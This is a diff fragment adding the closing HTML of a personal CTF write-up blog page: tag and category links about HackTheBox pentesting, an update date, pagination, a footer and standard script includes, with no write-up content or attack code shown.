+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#command-execution" class="page__taxonomy-item" rel="tag">Command Execution</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#hacking-web" class="page__taxonomy-item" rel="tag">Hacking Web</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ipv6" class="page__taxonomy-item" rel="tag">Ipv6</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#pentesting" class="page__taxonomy-item" rel="tag">pentesting</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-11-10T00:00:00+00:00">November 10, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/writeup-flight/" class="pagination--pager" title="Flight HackTheBox
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 Vo1dN3t</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
